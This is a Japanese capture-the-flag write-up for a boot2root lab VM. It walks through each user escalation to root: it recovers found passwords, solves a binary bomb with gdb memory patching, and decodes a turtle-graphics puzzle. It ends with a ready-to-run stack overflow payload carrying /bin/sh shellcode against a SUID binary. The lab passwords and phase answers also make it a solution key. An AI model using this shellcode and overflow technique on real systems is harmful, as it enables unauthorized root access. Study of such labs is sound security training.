# Boot2root - Writeup 2 (lmezard 〜 laurie)

## 1. ユーザー lmezard への侵入

### 認証情報の発見
Web Shell (`www-data`) 権限でサーバー内を探索したところ、`/home/LOOKATME/password` に以下の記述を発見した。

```text
lmezard:G!@M6f4Eatau{sF"
```

### SSH/コンソールログイン
このパスワードを使用して `lmezard` ユーザーとしてログインに成功した。

## 2. ユーザー laurie への昇格

### ft_fun チャレンジ
`lmezard` のホームディレクトリに `fun` という tar アーカイブと `README` が存在した。
`README` には「このチャレンジをクリアして結果を `laurie` の SSH パスワードとして使用せよ」との指示があった。

1.  **ファイルの展開:** `tar -xf fun` により `ft_fun/` ディレクトリが生成された。
2.  **構造の解析:** ディレクトリ内には大量の `.pcap` ファイルがあり、各ファイルに C 言語の断片と `//fileXXX` という形式の順序を示すコメントが含まれていた。
3.  **コマンドによる自動復元:** 以下のパイプラインを実行し、番号順にファイルを抽出・結合してソースコードを復元した。
    ```bash
    # 順序マーカーを抽出 -> 番号順にソート -> ファイル名のみ抽出 -> 結合
    grep -r "//file" ft_fun | sed 's/\(.*\):\/\/file\([0-9]*\)/\2 \1/' | sort -n | awk '{print $2}' | xargs cat > reconstructed.c
    
    # ソースコード内のマーカーを削除
    sed -i 's/\/\/file[0-9]*//g' reconstructed.c
    ```
4.  **パスワードの特定:** 復元したコードをコンパイル・実行した。
    ```bash
    gcc reconstructed.c -o solution && ./solution
    # 出力: MY PASSWORD IS: Iheartpwnage
    #      Now SHA-256 it and submit
    ```
5.  **ハッシュ化:** `Iheartpwnage` を指示通り SHA-256 でハッシュ化した。
    ```bash
    echo -n "Iheartpwnage" | sha256sum
    # 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
    ```

このハッシュ値をパスワードとして、`laurie` ユーザーでの SSH ログインに成功した。

## 3. ユーザー thor への道（Binary Bomb）

### bomb の解析
`laurie` のホームディレクトリに `bomb` という実行ファイルが存在する。これをリバースエンジニアリングして各フェーズの回答を特定した。

*   **Phase 1:** `Public speaking is very easy.`
    *   **詳細解析:**
        `gdb ./bomb` でデバッグを開始し、`disas phase_1` を実行すると以下のようなアセンブリコードが確認できる。
        ```assembly
        0x08048b2c <+12>:    push   0x80497c0    <-- 比較対象の文字列アドレス
        0x08048b32 <+18>:    call   0x08049030 <strings_not_equal>
        ```
        `strings_not_equal` 関数が呼ばれる直前に `push` されているアドレス（`0x80497c0`）に正解の文字列が格納されている。
        これを `x/s` コマンドで確認することで回答が得られる。
        ```bash
        (gdb) x/s 0x80497c0
        0x80497c0:      "Public speaking is very easy."
        ```
*   **Phase 2:** `1 2 6 24 120 720`
    *   **詳細解析:**
        `phase_2` は6つの数値を読み込み、最初の数が `1` であること、そして続く数が `(前の数) * (インデックス + 1)` という階乗の法則に従っているかをチェックする。
        ループ内の重要な比較処理は以下の通り。
        ```assembly
        0x08048b79 <+49>:    imul   -0x4(%esi,%ebx,4),%eax  ; eax = 期待値 (前の値 * index)
        0x08048b7e <+54>:    cmp    %eax,(%esi,%ebx,4)      ; 期待値と入力値(メモリ)を比較
        0x08048b81 <+57>:    je     0x8048b88               ; 一致なら次へ
        ```
    *   **解法 (GDBによるメモリ書き換え):**
        正しい数列を推測しなくても、GDBを使ってメモリ上の入力値を期待値（`eax`）で上書きすることで突破できる。
        `cmp` 命令でブレークし、以下のコマンドを実行して強制的に一致させる。
        ```bash
        (gdb) set {int}($esi + $ebx * 4) = $eax
        ```
        これを繰り返すことで、どのような入力（例: `1 1 1 1 1 1`）でもパスさせることが可能。最終的に判明する数列は `1 2 6 24 120 720` となる。
*   **Phase 3:** `1 b 214` (Case 1)
    *   **詳細解析:**
        `phase_3` は `sscanf` を使用して `"%d %c %d"` (数値 文字 数値) の形式で入力を受け取る。最初の数値に基づいてジャンプテーブル（Switch文）で分岐し、それぞれの Case で特定の文字と数値をチェックする。
        ```assembly
        0x08048bcd <+53>:    ja     0x8048c88               ; 最初の数値が 7 より大きい(または負)なら爆発
        0x08048bd6 <+62>:    jmp    *0x80497e8(,%eax,4)     ; ジャンプテーブルによる分岐
        ```
        例えば Case 1 (最初の数値が 1) の場合：
        ```assembly
        0x08048c00 <+104>:   mov    $0x62,%bl               ; 正解の文字 'b' (0x62) をセット
        0x08048c02 <+106>:   cmpl   $0xd6,-0x4(%ebp)        ; 2つ目の数値が 214 (0xd6) か比較
        ```
        最後に入力した文字と `%bl` を比較して終了する。
        ```assembly
        0x08048c8f <+247>:   cmp    -0x5(%ebp),%bl          ; 文字の最終チェック
        ```
    *   **解法 (GDBによる値の書き換え):**
        任意の入力（例: `0 a 0`）を行い、比較命令の直前でメモリを書き換えることで全ての Case を突破可能。
        ```bash
        (gdb) set {int}($ebp - 0x4) = 777   # 数値を正解に合わせる
        (gdb) set {char}($ebp - 0x5) = $bl  # 文字を正解(blレジスタの値)に合わせる
        ```
        Case 1 を選んだ場合、入力は `1 b 214` となる。ほかにも `0 q 777` など計8通りの正解が存在する。
*   **Phase 4:** `9`
    *   **詳細解析:**
        `phase_4` は単一の数値を読み取り、それを引数として再帰関数 `func4` を呼び出す。その戻り値が `55` (`0x37`) であることを要求する。
        ```assembly
        0x08048d15 <+53>:    call   0x8048ca0 <func4>
        0x08048d1d <+61>:    cmp    $0x37,%eax      ; func4の結果が 55 か比較
        ```
        `func4` のアセンブリを見ると、`func4(n-1) + func4(n-2)` を計算するフィボナッチ数列の実装であることがわかる。
        ```assembly
        0x08048cae <+14>:    jle    0x8048cd0       ; n <= 1 なら 1 を返す
        ...
        0x08048cca <+42>:    add    %esi,%eax       ; 再帰呼び出しの結果を加算
        ```
    *   **解法:**
        フィボナッチ数列において、結果が `55` となる項番を計算する。
        `1, 1, 2, 3, 5, 8, 13, 21, 34, 55`
        順に数えると10番目だが、プログラム上のインデックス処理（`n=0`から開始など）を確認するか、総当たりで試すと、入力 `9` で `55` が返ることが判明する。
*   **Phase 5:** `opekma` (変換後に `giants` となる文字列)
    *   **詳細解析:**
        `phase_5` は6文字の入力を受け取り、各文字の下位4ビット（`char & 0x0F`）をインデックスとして、特定の変換テーブルから文字を抽出して新しい文字列を作成する。
        ```assembly
        0x08048d5a <+46>:    and    $0xf,%al             ; 入力文字の下位4bitを抽出
        0x08048d5f <+51>:    mov    (%eax,%esi,1),%al    ; テーブル[index]から文字を取得
        ```
        変換後の文字列が、アドレス `0x804980b` に格納されている文字列（`giants`）と一致すればクリアとなる。
    *   **解法:**
        1. GDBで変換テーブル（`0x804b220`）と目標の文字列（`0x804980b`）を確認する。
           ```bash
           (gdb) x/s 0x804b220
           0x804b220: "isrveawhobpnutfg"
           (gdb) x/s 0x804980b
           0x804980b: "giants"
           ```
        2. `giants` の各文字がテーブルの何番目にあるかを逆算する。
           - `g`: 15番目 (0xF)
           - `i`: 0番目 (0x0)
           - `a`: 5番目 (0x5)
           - `n`: 11番目 (0xB)
           - `t`: 13番目 (0xD)
           - `s`: 1番目 (0x1)
        3. 下位4ビットがこれらの数値になるASCII文字を選択する（例: `o`(0x6F), `p`(0x70), `e`(0x65), `k`(0x6B), `m`(0x6D), `a`(0x61)）。結果、`opekma` が導き出される。
*   **Phase 6:** `4 2 6 3 1 5`
    *   **詳細解析:**
        `phase_6` は 1〜6 の重複しない数字（順列）を読み込み、それを利用してメモリ上の連結リストを並べ替える。最終的に、並べ替えたリストの各ノードが持つ数値が**降順（大きい順）**に並んでいるかをチェックする。
        ```assembly
        0x08048e75 <+221>:   cmp    (%edx),%eax         ; 現在のノードと次のノードの値を比較
        0x08048e77 <+223>:   jge    0x8048e7e           ; 現在 >= 次 ならOK
        ```
        連結リストの各ノード（`node1` は `0x804b26c`）は以下の構造になっている。
        - 0バイト目: 数値 (Value)
        - 4バイト目: 元のインデックス
        - 8バイト目: 次のノードへのポインタ
    *   **解法:**
        GDBで各ノードの数値を調査し、大きい順に並べ替える。
        1. 各ノードの値を抽出：
           - Index 1: 253 (`0x804b26c`)
           - Index 2: 725
           - Index 3: 301
           - Index 4: 997
           - Index 5: 212
           - Index 6: 432
        2. 値の大きい順にソート：
           `997 (4) > 725 (2) > 432 (6) > 301 (3) > 253 (1) > 212 (5)`
        3. 対応するインデックスを並べた `4 2 6 3 1 5` が正解となる。
*   **Secret Phase:** `1001`
    *   **詳細解析:**
        Phase 4 クリア時に `9 austinpowers` と入力することで到達できる隠しステージ。
        `secret_phase` 関数は数値を1つ読み込み、それを引数として `fun7` を呼び出す。その戻り値が `7` であることを要求する。
        ```assembly
        0x08048f1d <+53>:    call   0x8048e94 <fun7>
        0x08048f25 <+61>:    cmp    $0x7,%eax      ; 戻り値が 7 か比較
        ```
        `fun7` は二分探索木（Binary Search Tree）を探索する関数で、以下のルールで戻り値を計算する。
        - 値が一致: `0`
        - 左の枝へ進む: `2 * fun7(left)`
        - 右の枝へ進む: `2 * fun7(right) + 1`
    *   **解法:**
        戻り値が `7` になるには、`2 * (2 * (2 * 0 + 1) + 1) + 1` という計算経路を通る必要がある。つまり、ルートから **「右 → 右 → 右」** と3回辿った先にあるノードの値が正解となる。
        GDBでメモリ（`0x804b320`）を確認しながら木を辿る：
        1. Root (`n1`): `36`, 右は `0x804b308`
        2. `n22`: `50`, 右は `0x804b2d8`
        3. `n34`: `107`, 右は `0x804b278`
        4. `n48`: **`1001`** (一致)
        この結果、入力値 `1001` が正解となる。

### SSH ログイン
`README` のヒント `P 2 b o 4` は、各フェーズのキーワード（**P**ublic... / Phase **2** / Case **b** / **o**pekma / Phase **4** or 6の**4**）を繋げることを示唆している。解析した各フェーズの回答をすべて連結したものが `thor` ユーザーのパスワードとなる。

**最終的なパスワード:**
`Publicspeakingisveryeasy.126241207201b2149austinpowersopekma4263151001`

**パスワードの構成:**
1.  **Phase 1:** `Publicspeakingisveryeasy.` (スペースを除去)
2.  **Phase 2:** `12624120720`
3.  **Phase 3:** `1b214`
4.  **Phase 4:** `9`
5.  **Secret Phase Trigger:** `austinpowers`
6.  **Phase 5:** `opekma`
7.  **Phase 6:** `426315`
8.  **Secret Phase:** `1001`

このパスワードを使用して `thor` ユーザーへの昇格に成功した。

## 4. ユーザー zaz への昇格（Turtle Challenge）

### turtle チャレンジ
`thor` のホームディレクトリに `turtle` というファイルと、指示が書かれた `README` があった。
`turtle` ファイルには、フランス語によるタートルグラフィックス（亀を動かして図形を描くプログラム）の命令が大量（約33KB）に記述されていた。

1.  **命令の解析:**
    ファイル内の主要な命令は以下の通り。
    - `Avance X spaces`: X歩進む
    - `Recule X spaces`: X歩下がる
    - `Tourne gauche de X degrees`: 左にX度回転
    - `Tourne droite de X degrees`: 右にX度回転

2.  **描画スクリプトの作成:**
    これらの命令をパースし、座標計算を行って図形を可視化する Python スクリプト（`draw_turtle_svg.py`）を作成した。座標系を管理し、一筆書きの経路を SVG ファイルとして出力する。

3.  **キーワードの特定:**
    生成された `turtle_result.svg` を確認したところ、一筆書きで **`SLASH`** という文字が描画されていた。

4.  **パスワードの生成:**
    `README` の "Can you digest the message?" というヒント（digest = ハッシュ値の意）に従い、`SLASH` の MD5 ハッシュを計算した。
    ```bash
    echo -n "SLASH" | md5sum
    # 646da671ca01bb5d84dbb5fb2238dc8e
    ```

このハッシュ値 `646da671ca01bb5d84dbb5fb2238dc8e` をパスワードとして使用し、`zaz` ユーザーでのログインに成功した。

## 5. Root 権限の奪取（exploit_me）

### バイナリ解析
`zaz` のホームディレクトリに SUID 設定されたバイナリ `exploit_me` が存在した。
ソースを調査したところ、`strcpy` 関数を使用した典型的な **Buffer Overflow (BoF)** の脆弱性があった。

*   **ASLR:** 無効 (`/proc/sys/kernel/randomize_va_space` が 0)
*   **NX:** 無効 (スタックが実行可能)

### エクスプロイトの実行
スタックのアドレスが固定されており、実行可能であるため、スタック上にシェルコードを配置してリターンアドレスを書き換える攻撃を行った。

1.  **オフセット特定:** 140バイトの後にリターンアドレスがあることを特定。
2.  **ペイロード構成:** `[NOP Slide] + [Shellcode] + [Stack Address]`
3.  **実行コマンド:**
    ```bash
    ./exploit_me $(python -c "print('\x90'*100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A'*(140-100-23) + '\x60\xfc\xff\xbf')")
    ```

この結果、root 権限 (euid=0) を獲得し、システムを完全に支配下に置いた。

---
**結論:**
Webの脆弱性から侵入し、各ユーザーのチャレンジ（アーカイブ復元、バイナリ爆弾、タートルグラフィックス）を順番に突破。最後に古典的なスタックベースのバッファオーバーフローを利用して Root 権限を取得した。
